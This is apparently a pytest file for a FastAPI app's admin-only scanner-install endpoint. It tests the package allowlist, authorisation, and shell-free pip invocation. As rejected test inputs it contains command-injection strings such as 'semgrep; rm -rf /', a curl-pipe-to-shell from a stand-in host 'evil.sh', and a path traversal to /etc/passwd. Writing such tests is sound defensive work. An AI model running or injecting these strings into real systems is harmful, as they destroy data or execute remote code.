"""Tests for issue #216: one-click scanner install.

Most of these are about what the endpoint *refuses*. Installing software in
response to an HTTP request is an obvious RCE surface, and the only reason it
is defensible here is that the caller picks a registry key rather than naming
a package -- so the tests that matter are the ones proving there is no path
from a request to an arbitrary package, and that a non-admin cannot reach it
at all.

Same in-memory SQLite + TestClient + session-token-login pattern as
tests/test_stale_jobs.py.
"""
from datetime import datetime, timedelta
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.pool import StaticPool
from sqlmodel import Session, SQLModel, create_engine, select

import app.api.deps as deps_module
from app.api.deps import get_session
from app.core import tool_install
from app.core.config import settings
from app.core.security import create_session_token, hash_password
from app.core.tool_registry import TOOL_REGISTRY
from app.main import app
from app.models.models import ToolInstallRun, User, UserRole


@pytest.fixture()
def engine():
    eng = create_engine("sqlite://", connect_args={"check_same_thread": False}, poolclass=StaticPool)
    SQLModel.metadata.create_all(eng)
    return eng


@pytest.fixture()
def client(engine):
    def override_get_session():
        with Session(engine) as session:
            yield session

    app.dependency_overrides[get_session] = override_get_session
    original_engine = deps_module.engine
    deps_module.engine = engine
    c = TestClient(app)
    yield c
    app.dependency_overrides.clear()
    deps_module.engine = original_engine


def _login(client, engine, role=UserRole.ADMIN):
    email = f"{role.value}-{id(object())}@example.com"
    with Session(engine) as session:
        user = User(email=email, name="Test", password_hash=hash_password("whatever123"), role=role)
        session.add(user)
        session.commit()
        session.refresh(user)
        uid = user.id
        token = create_session_token(user.id, user.token_version)
    client.cookies.set("rikugan_session", token)
    return client, uid


# ---------------------------------------------------------------------------
# The allowlist
# ---------------------------------------------------------------------------


def test_resolve_package_returns_none_for_an_unknown_tool():
    assert tool_install.resolve_package("definitely-not-a-tool") is None


def test_resolve_package_returns_none_for_a_tool_needing_brew_or_go():
    # gitleaks/trivy/gosec/tfsec/kics are not pip-installable, so they get no
    # button rather than a button that cannot work.
    for tool in ("gitleaks", "trivy", "gosec", "tfsec", "kics"):
        assert tool_install.resolve_package(tool) is None, tool


def test_resolve_package_returns_the_registry_package():
    assert tool_install.resolve_package("semgrep") == "semgrep"
    assert tool_install.resolve_package("medusa") == "medusa-security"


@pytest.mark.parametrize(
    "hostile",
    [
        "semgrep; rm -rf /",
        "semgrep && curl evil.sh | sh",
        "../../../etc/passwd",
        "-e /tmp/evil",
        "https://evil.example/pkg.tar.gz",
        "semgrep\nrm -rf /",
    ],
)
def test_resolve_package_refuses_anything_not_a_registry_key(hostile):
    # The allowlist is the whole security argument: a caller supplies a key,
    # and a key that is not in the registry resolves to nothing at all.
    assert tool_install.resolve_package(hostile) is None


def test_installable_tools_are_a_subset_of_the_registry():
    keys = {e["tool"] for e in TOOL_REGISTRY}
    assert tool_install.installable_tools() <= keys


# ---------------------------------------------------------------------------
# Endpoint authorisation
# ---------------------------------------------------------------------------


def test_install_requires_authentication(client):
    assert client.post("/api/tools/semgrep/install").status_code in (401, 403)


def test_install_is_refused_to_non_admins(client, engine):
    # Installing software changes the environment every workspace shares, so
    # this is admin-only rather than SECURITY_ENGINEER-and-above.
    client, _ = _login(client, engine, role=UserRole.USER)
    assert client.post("/api/tools/semgrep/install").status_code == 403


def test_install_rejects_a_tool_that_is_not_installable(client, engine):
    client, _ = _login(client, engine)
    res = client.post("/api/tools/gitleaks/install")
    assert res.status_code == 400


def test_install_rejects_an_unknown_tool_without_dispatching(client, engine):
    client, _ = _login(client, engine)
    with patch("app.api.tools.install.run_tool_install.delay") as delay:
        res = client.post("/api/tools/not-a-real-tool/install")
    assert res.status_code == 400
    delay.assert_not_called()


def test_install_rejects_an_injection_shaped_tool_name(client, engine):
    client, _ = _login(client, engine)
    with patch("app.api.tools.install.run_tool_install.delay") as delay:
        res = client.post("/api/tools/semgrep;rm -rf ~/install")
    assert res.status_code in (400, 404)
    delay.assert_not_called()


# ---------------------------------------------------------------------------
# Dispatch + polling
# ---------------------------------------------------------------------------


def test_install_creates_a_run_and_dispatches(client, engine):
    client, uid = _login(client, engine)
    with patch("app.api.tools.install.run_tool_install.delay") as delay:
        res = client.post("/api/tools/semgrep/install")

    assert res.status_code == 202
    body = res.json()
    assert body["status"] == "running"
    assert body["package"] == "semgrep"
    delay.assert_called_once_with(run_id=body["run_id"])

    with Session(engine) as session:
        run = session.get(ToolInstallRun, body["run_id"])
        # The row is the audit record; an install with no attributable actor
        # would defeat the point of having one.
        assert run.requested_by_user_id == uid


def test_install_records_the_package_resolved_at_dispatch_time(client, engine):
    # Not looked up later: the registry can change under a historical row, and
    # the record should say what was actually installed.
    client, _ = _login(client, engine)
    with patch("app.api.tools.install.run_tool_install.delay"):
        body = client.post("/api/tools/medusa/install").json()
    assert body["package"] == "medusa-security"


def test_poll_returns_the_run(client, engine):
    client, _ = _login(client, engine)
    with patch("app.api.tools.install.run_tool_install.delay"):
        run_id = client.post("/api/tools/semgrep/install").json()["run_id"]

    body = client.get(f"/api/tools/installs/{run_id}").json()
    assert body["run_id"] == run_id
    assert body["tool"] == "semgrep"


def test_poll_is_admin_only(client, engine):
    # The output tail can carry environment detail from pip; it is not for
    # every logged-in user.
    client, _ = _login(client, engine, role=UserRole.USER)
    assert client.get("/api/tools/installs/1").status_code == 403


def test_poll_404s_for_a_missing_run(client, engine):
    client, _ = _login(client, engine)
    assert client.get("/api/tools/installs/999999").status_code == 404


def test_a_stuck_install_is_reported_failed_not_running(client, engine):
    # A dead worker would otherwise leave this "running" forever, which is
    # indistinguishable from a slow install.
    client, _ = _login(client, engine)
    with Session(engine) as session:
        run = ToolInstallRun(
            tool="semgrep",
            package="semgrep",
            status="running",
            started_at=datetime.utcnow() - timedelta(seconds=settings.stale_job_timeout_seconds + 60),
        )
        session.add(run)
        session.commit()
        session.refresh(run)
        run_id = run.id

    body = client.get(f"/api/tools/installs/{run_id}").json()
    assert body["status"] == "failed"
    assert body["error"]


# ---------------------------------------------------------------------------
# perform_install
# ---------------------------------------------------------------------------


def _run(engine, tool="semgrep", package="semgrep"):
    with Session(engine) as session:
        run = ToolInstallRun(tool=tool, package=package, status="running")
        session.add(run)
        session.commit()
        session.refresh(run)
        return run.id


class _Proc:
    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def test_perform_install_builds_an_argv_list_with_no_shell(engine):
    run_id = _run(engine)
    with Session(engine) as session:
        run = session.get(ToolInstallRun, run_id)
        with patch("app.core.tool_install.subprocess.run", return_value=_Proc(stdout="ok")) as sub, patch(
            "app.core.tool_install._installed_version", return_value="1.2.3"
        ):
            tool_install.perform_install(session, run)

    cmd = sub.call_args[0][0]
    assert isinstance(cmd, list)
    # The package is one element, never interpolated into a string, and no
    # call anywhere sets shell=True.
    assert cmd[-1] == "semgrep"
    assert "-m" in cmd and "pip" in cmd and "install" in cmd
    assert sub.call_args.kwargs.get("shell") in (None, False)


def test_perform_install_records_the_version_on_success(engine):
    run_id = _run(engine)
    with Session(engine) as session:
        run = session.get(ToolInstallRun, run_id)
        with patch("app.core.tool_install.subprocess.run", return_value=_Proc(stdout="Successfully installed")), patch(
            "app.core.tool_install._installed_version", return_value="1.136.0"
        ):
            tool_install.perform_install(session, run)
        assert run.status == "completed"
        assert run.installed_version == "1.136.0"


def test_a_clean_install_whose_binary_does_not_run_is_a_failure(engine):
    # This is the setuptools/pkg_resources shape: pip exits zero and the tool
    # is then unusable. Reporting it as success produces silent zero-finding
    # scans later, which read exactly like a clean repo.
    run_id = _run(engine)
    with Session(engine) as session:
        run = session.get(ToolInstallRun, run_id)
        with patch("app.core.tool_install.subprocess.run", return_value=_Proc(stdout="Successfully installed")), patch(
            "app.core.tool_install._installed_version", return_value=""
        ):
            tool_install.perform_install(session, run)
        assert run.status == "failed"
        assert "did not report a version" in run.error


def test_pip_failure_is_recorded_with_its_output(engine):
    run_id = _run(engine)
    with Session(engine) as session:
        run = session.get(ToolInstallRun, run_id)
        with patch(
            "app.core.tool_install.subprocess.run",
            return_value=_Proc(returncode=1, stderr="ERROR: No matching distribution"),
        ):
            tool_install.perform_install(session, run)
        assert run.status == "failed"
        assert "No matching distribution" in run.output_tail


def test_a_timeout_is_recorded_rather_than_raised(engine):
    import subprocess as sp

    run_id = _run(engine)
    with Session(engine) as session:
        run = session.get(ToolInstallRun, run_id)
        with patch("app.core.tool_install.subprocess.run", side_effect=sp.TimeoutExpired("pip", 900)):
            tool_install.perform_install(session, run)
        # Never raises: a task that dies leaves the row running forever.
        assert run.status == "failed"
        assert "timed out" in run.error


def test_output_is_truncated(engine):
    run_id = _run(engine)
    with Session(engine) as session:
        run = session.get(ToolInstallRun, run_id)
        with patch("app.core.tool_install.subprocess.run", return_value=_Proc(stdout="x" * 50_000)), patch(
            "app.core.tool_install._installed_version", return_value="1.0"
        ):
            tool_install.perform_install(session, run)
        # pip can emit megabytes; this is a display aid, not a build log.
        assert len(run.output_tail) < tool_install.OUTPUT_TAIL_CHARS + 100


def test_perform_install_refuses_a_row_naming_a_non_installable_tool(engine):
    # Defence in depth: the API refuses this first, but this module must not
    # be safe only because its callers are careful.
    run_id = _run(engine, tool="gitleaks", package="gitleaks")
    with Session(engine) as session:
        run = session.get(ToolInstallRun, run_id)
        with patch("app.core.tool_install.subprocess.run") as sub:
            tool_install.perform_install(session, run)
        sub.assert_not_called()
        assert run.status == "failed"


# ---------------------------------------------------------------------------
# Registry exposure
# ---------------------------------------------------------------------------


def test_registry_marks_installable_tools(client, engine):
    client, _ = _login(client, engine)
    entries = {e["tool"]: e for e in client.get("/api/tools/registry").json()}
    assert entries["semgrep"]["installable"] is True
    assert entries["gitleaks"]["installable"] is False


def test_installable_flag_agrees_with_the_install_endpoint(client, engine):
    # A tool advertising a button the install path would refuse is a broken
    # promise; deriving both from pip_package makes that impossible.
    client, _ = _login(client, engine)
    for entry in client.get("/api/tools/registry").json():
        expected = tool_install.resolve_package(entry["tool"]) is not None
        assert entry["installable"] is expected, entry["tool"]
